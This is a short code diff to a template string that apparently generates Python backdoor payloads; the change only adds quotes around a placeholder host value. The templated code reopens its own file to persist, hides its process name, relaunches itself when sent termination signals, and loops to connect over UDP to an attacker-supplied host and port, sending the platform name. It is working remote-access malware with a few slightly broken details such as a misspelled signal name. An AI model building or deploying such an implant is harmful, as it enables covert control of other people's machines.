@@ -9,7 +9,7 @@ def {keepyourselfalive}() :\n\tf = open(str(__file__) , "rb")
 {keepyourselfalive}()
 {connected} = False\nwhile not {connected} :\n\ttry :
 \t\tconn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-\t\tconn.connect(({host} , int({port})))
+\t\tconn.connect(('{host}' , int({port})))
 \t\t{connected} = True 
 \texcept :\n\t{connected} = False\n\twhile {connected} :\n\t\ttry : 
 \t\t\tconn.send((sys.platform).encode("UTF-8"))
@@ -30,7 +30,7 @@ def {hide_process}():\n\tch = string.uppercase + string.digits
 \tsignal.signal(signal.SIGTERM, {relaunch})\n\tsignal.signal(signal.SIGTINT, {relaunch})\n{hide_process}()
 {connected} = False
 while not {connected}:\n\ttry:\n\t\tconn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-\t\tconn.connect(({host}, int({port})))
+\t\tconn.connect(('{host}', int({port})))
 \t\t{connected} = True
 \texcept:\n\t\t{connected} = False\n\telse:\n\t\tconn.send((sys.platform).encode("UTF-8"))
 while connected:\n\t\ttry:
